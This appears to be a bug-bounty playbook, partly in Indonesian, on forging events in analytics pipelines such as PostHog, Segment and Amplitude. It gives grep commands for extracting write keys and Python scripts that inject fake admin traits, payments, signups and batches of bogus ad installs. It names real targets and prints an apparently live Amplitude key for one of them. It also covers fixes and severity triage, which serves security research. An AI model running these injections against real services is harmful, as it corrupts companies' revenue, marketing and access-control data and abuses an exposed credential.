# Third-party Analytics Data Pipeline Injection

## Overview
Third-party analytics services (Segment, PostHog, Amplitude, Mixpanel, Heap) often embed write keys in client-side JavaScript for data collection. While write keys ARE public by design, the ability to inject arbitrary user traits/events creates a vulnerability class where attacker-controlled data flows into downstream business systems.

## Detection
- **Client-side JS analysis**: Search production bundles for analytics write keys:
  ```bash
  # Segment
  grep -oE '[A-Za-z0-9]{32}' bundle.js | head -20
  # Look for env vars
  grep -oE 'NEXT_PUBLIC_[A-Z_]+_KEY' bundle.js
  
  # Amplitude
  grep -oE 'apiKey["\x27:]+[A-Za-z0-9]{32}' bundle.js
  
  # Mixpanel
  grep -oE 'mixpanel\.init\(["\x27][A-Za-z0-9]{32}' bundle.js
  ```
- **Source map analysis**: Extract maps to find unminified key references
- **Network interception**: Capture Segment/Amplitude endpoints in browser DevTools

## Exploitation
### PostHog Write Key Injection
PostHog is a popular product analytics platform. Write keys (`phc_*`) are exposed in client-side page source via `window.posthog_key` or `window.__posthog_config`. Unlike Segment, PostHog accepts events via `POST https://us.i.posthog.com/capture/` (or EU: `eu.i.posthog.com/capture/`).

**Extraction:**
```bash
# Search page source for PostHog key
grep -oE 'phc_[A-Za-z0-9_-]{32,}' newsroom.html | head -5
# Look for window.posthog_key
grep -oE 'posthog_key["\x27:]+["\x27]phc_[^"\x27]+' newsroom.html
# Check for config with company_id
grep -oE 'company_id["\x27:]+[0-9]+' newsroom.html
```

**Injection payloads (all POST to `https://us.i.posthog.com/capture/`):**
```python
import requests, json

WRITE_KEY = "phc_XXXX"  # extracted
API_KEY=***     # PostHog uses write key as api_key
ENDPOINT = "https://us.i.posthog.com/capture/"

# 1. Fake pageview with is_admin flag
payload = {"api_key": API_KEY, "event": "$pageview", "properties": {"$current_url": "https://admin.internal/dashboard", "is_admin": True}, "distinct_id": "attacker_fake_user"}
requests.post(ENDPOINT, json=payload)  # → {"status":"Ok"}

# 2. Fake signup event
payload = {"api_key": API_KEY, "event": "user_signed_up", "properties": {"email": "admin@company.com", "role": "admin", "company_id": 39}, "distinct_id": "attacker_fake_user"}
requests.post(ENDPOINT, json=payload)

# 3. Feature flag injection
payload = {"api_key": API_KEY, "event": "$feature_flag_called", "properties": {"$feature_flag": "admin_panel", "$feature_flag_response": "true"}, "distinct_id": "attacker_fake_user"}
requests.post(ENDPOINT, json=payload)

# 4. User identification with admin properties
payload = {"api_key": API_KEY, "event": "$identify", "properties": {"email": "admin@company.com", "role": "admin", "is_admin": True, "company_id": 39}, "distinct_id": "attacker_user"}
requests.post(ENDPOINT, json=payload)

# 5. Fake payment event (corrupts revenue analytics)
payload = {"api_key": API_KEY, "event": "payment_completed", "properties": {"$amount": 99999, "$currency": "USD", "plan": "enterprise"}, "distinct_id": "attacker_user"}
requests.post(ENDPOINT, json=payload)
```

**All payloads return `{"status":"Ok"}` — PostHog does NOT validate event content.**

**Company ID discovery:** Look for `company_id` in page source (often in PostHog config or DNA CMS data). This identifies the PostHog workspace.

**Impact escalation:**
- Fake `$pageview` with is_admin:true → may show up in admin dashboards
- Fake `user_signed_up` → corrupts growth metrics
- Fake `$feature_flag_called` → can skew A/B test results
- Fake `payment_completed` → corrupts revenue reporting
- `$identify` with admin traits → poisons user segmentation

**Severity:** Depends on downstream consumption (see Impact Escalation table below). Typically MEDIUM if analytics-only, HIGH if data flows to business systems.

### Segment Write Key Injection
```python
import requests

WRITE_KEY = "extracted_write_key"
SEGMENT_URL = "https://api.segment.io/v1/identify"

# Inject arbitrary traits
payload = {
    "writeKey": WRITE_KEY,
    "userId": "target_user_id",
    "traits": {
        "role": "admin",
        "isPremium": True,
        "account_balance": 999999,
        "risk_score": 0.0
    }
}

response = requests.post(SEGMENT_URL, json=payload)
# Downstream systems may consume these traits
```

### Amplitude/Mixpanel Injection
```python
# Amplitude
payload = {
    "api_key": "extracted_key",
    "user_id": "target",
    "event_type": "premium_purchase",
    "event_properties": {"amount": 999.99, "plan": "enterprise"}
}

# Mixpanel
payload = {
    "event": "subscription_upgrade",
    "properties": {"token": "extracted_key", "plan": "enterprise", "duration": "12months"}
}
```

## Impact Escalation
| Severity | Scenario |
|----------|----------|
| LOW | Analytics data used only for dashboards/reports |
| MEDIUM | Data affects user segmentation or marketing automation |
| HIGH | Data affects financial decisions (pricing, fraud scoring) |
| CRITICAL | Data affects access control or payment processing |

## By-Design Consideration
**Write keys ARE public by design.** Segment, Amplitude, and Mixpanel documentation explicitly states that write keys are safe to expose in client-side code. The vulnerability exists only when:
1. Downstream systems consume data WITHOUT server-side validation
2. Injected traits affect financial/access decisions
3. No data cleaning pipeline exists between analytics and business logic

## Fix Recommendations
1. **Server-side validation**: Validate all analytics data before consumption
2. **Trait allowlist**: Only accept specific, expected traits
3. **Data cleaning pipeline**: Sanitize analytics data before it reaches business systems
4. **Monitoring**: Alert on unusual trait values or bulk injection attempts

## Real-world Findings
- **Bitso (2026-08)**: Segment write key `NEXT_PUBLIC_SEGMENT_BITBANK_WRITE_KEY` extracted from production JS. Successfully injected arbitrary user traits via `identify()`, `track()`, and `page()` calls. Severity: LOW (analytics-only consumption). Additional third-party IDs found (all **REDACTED** — recover them from the target's own JS bundle at recon time; never persist live keys in a skill): VWO account id, Amplitude client id, Adjust token, Meta Pixel id. Segment endpoint: `segment.<target>/tracking/v1/` (proxied, not direct to segment.io).

## ⚠️ Impact Validation Checklist (MANDATORY before submitting)

**JANGAN claim a finding sebagai MEDIUM+ tanpa membuktikan dampak bisnis.**

Setelah berhasil inject data, WAJIB lakukan:

1. **Trace data flow**: Data dari write key → ke mana? Hanya dashboard analytics? Atau ke sistem bisnis?
2. **Check downstream consumers**: Apakah ada Salesforce, Intercom, Zendesk, atau financial system yang consume data dari Segment?
3. **Prove impact**: Bisakah attacker manipulate:
   - User traits yang mempengaruhi KYC/verification status?
   - Financial event data yang mempengaruhi reporting/decisions?
   - Role/permission traits yang mempengaruhi access control?
4. **30-minute time-box**: Kalau tidak bisa trace data flow dalam 30 menit → submit sebagai LOW/INFO, bukan MEDIUM.

**Bitso lesson**: Semua injection API return `{"success": true}`, tapi TIDAK ADA bukti data mengalir ke sistem keuangan. Segala data hanya ke analytics pipeline → Severity: LOW.

### Critical Validation Steps (from Bitso deep test)

**After successful injection, ALWAYS test:**

1. **Can you READ back injected data?**
   ```bash
   # Try to query Segment for your injected user
   curl "https://target.com/tracking/v1/import/users/WRITE_KEY:exploit_test_001"
   # If 404 → you can't verify injection → severity downgrade
   ```

2. **What services consume Segment data?**
   ```bash
   # Check CSP for analytics endpoints
   curl -s -D- "https://target.com" | grep -oE 'connect-src[^;]+' | tr ' ' '\n' | grep -E 'amplitude|segment|mixpanel|salesforce|intercom' | head -10
   # Segment → Amplitude → Dashboard = analytics only (LOW)
   # Segment → Salesforce → CRM = potential business impact (MEDIUM)
   ```

3. **30-minute time-box rule**
   - If you can't trace data flow in 30 minutes → submit as LOW/INFO
   - Don't claim "data affects financial decisions" without proof
   - The burden of proof is on YOU, not the triager

**Bitso findings**:
- Write key: `[REDACTED — live client write key, recover from the target's JS bundle at recon time]` (extracted from JS bundle)
- Endpoint: `segment.bitso.com/tracking/v1/` (self-hosted proxy, not segment.io)
- All 5 injection types succeed: identify, track, page, batch, alias
- BUT: Cannot read back data (404 on read endpoints)
- AND: No downstream business system consumer found
- **Severity: LOW** (analytics-only, no proof of business impact)

---

## Server-Side Analytics Proxy Injection (UpScrolled 2026-09)

**Distinct from direct API key abuse.** Some platforms proxy analytics requests through their own backend (e.g., `sync.target.com/2/httpapi` → Amplitude). This proxy may bypass rate limits, add server-side context (IP, user-agent), and make injected events appear more legitimate.

### Detection
1. **Network tab**: Look for analytics POST requests going to the TARGET's own domain (not directly to Amplitude/Segment):
   ```
   sync.target.com/2/httpapi    ← proxy (YOUR target)
   api.amplitude.com/2/httpapi  ← direct (Amplitude)
   ```
2. **Config objects**: Check `window.__TARGET_PUBLIC_CONFIG__` or similar globals for API keys AND proxy endpoints
3. **JS bundle analysis**: Search for proxy URLs in analytics initialization code:
   ```bash
   grep -oE 'https?://[a-z]+\.target\.com/[0-9]+/httpapi' bundle.js
   grep -oE 'amplitude.*proxy|proxy.*amplitude' bundle.js
   ```

### Exploitation
```python
import requests, json

# UpScrolled: proxy endpoint at sync.upscrolled.com/2/httpapi
PROXY_URL = "https://sync.target.com/2/httpapi"
AMPLITUDE_KEY = "extracted_from_js"  # e.g., window.__CONFIG__.amplitude_key

# 1. Fake subscription event (corrupts revenue dashboard)
payload = {
    "api_key": AMPLITUDE_KEY,
    "events": [{
        "event_type": "subscription_started",
        "user_id": "fake_premium_001",
        "event_properties": {
            "plan": "premium_lifetime",
            "amount": 499.99,
            "currency": "USD",
            "source": "organic"
        },
        "user_properties": {
            "$set": {
                "is_premium": True,
                "plan": "enterprise",
                "ltv": 15000
            }
        }
    }]
}
resp = requests.post(PROXY_URL, json=payload)
# → {"code": 200, "events_ingested": 1} ✅

# 2. Mass user growth inflation (100 fake signups)
events = [{"event_type": "user_signup", "user_id": f"fake_{i}", 
           "event_properties": {"source": "organic"}} for i in range(100)]
resp = requests.post(PROXY_URL, json={"api_key": AMPLITUDE_KEY, "events": events})
# → {"events_ingested": 100} ✅

# 3. Ad attribution pollution (wrong marketing ROI)
for source in ["google_ads", "facebook_ads", "tiktok_ads"]:
    events = [{"event_type": "app_install", "user_id": f"fake_{source}_{i}",
               "event_properties": {"campaign": "none", "source": source, "cost": 2.50}}
              for i in range(20)]
    requests.post(PROXY_URL, json={"api_key": AMPLITUDE_KEY, "events": events})
```

### Why Proxy Abuse > Direct API Abuse
| Factor | Direct API | Proxy Abuse |
|--------|-----------|-------------|
| Rate limits | Amplitude's rate limits apply | Bypassed (proxy may not enforce) |
| Event context | Client-only (attacker-controlled) | Server may add IP, user-agent, session |
| Legitimacy | Events look suspicious | Events appear to come from real users |
| Filtering | Amplitude may filter anomalies | Proxy may forward ALL requests unfiltered |
| Detection | Amplitude abuse logs visible | Only visible in proxy logs |

### Impact Assessment
| Scenario | Severity | Rationale |
|----------|----------|-----------|
| Analytics-only dashboard corruption | LOW | Data only affects reports |
| Revenue metrics manipulation | MEDIUM | Financial reporting decisions affected |
| Attribution/campaign data pollution | MEDIUM | Marketing budget allocation decisions affected |
| User property injection (role=admin) | MEDIUM-HIGH | If consumed by RBAC or segmentation |
| Feature flag manipulation via analytics | HIGH | If analytics drives feature toggles |

### UpScrolled Case Study
- **Proxy**: `sync.upscrolled.com/2/httpapi` → forwards to Amplitude
- **Key**: `8b54609e6ee48c53584284b4ed4192d2` (from `window.__UPSCROLLED_PUBLIC_CONFIG__`)
- **Confirmed**: 100 events ingested in single batch, no auth, no rate limit, no filtering
- **Injection types**: subscription_started, user_signup, app_install with revenue/cost properties
- **Also found**: PostHog injection via direct API (all events return `{"status":"Ok"}`), RevenueCat API key exposure with subscriber enumeration

---

## Third-party Key Extraction Patterns
- **Amplitude**: `grep -oE 'apiKey["':]+["\x27][A-Za-z0-9]{32}'` → may be invalid/expired
- **Adjust**: `grep -oE 'app_token["':]+["\x27][A-Za-z0-9]{12}'` → mobile attribution
- **Meta Pixel**: `grep -oE 'fbq\(.init.,\s*"[0-9]+"'` → Facebook tracking
- **Segment**: `grep -oE 'writeKey["':]+["\x27][A-Za-z0-9]{20,}'` → data injection vector
- **Sentry DSN**: `grep -oE 'https://[a-f0-9]+@[a-z0-9.]+/[0-9]+'` → error monitoring
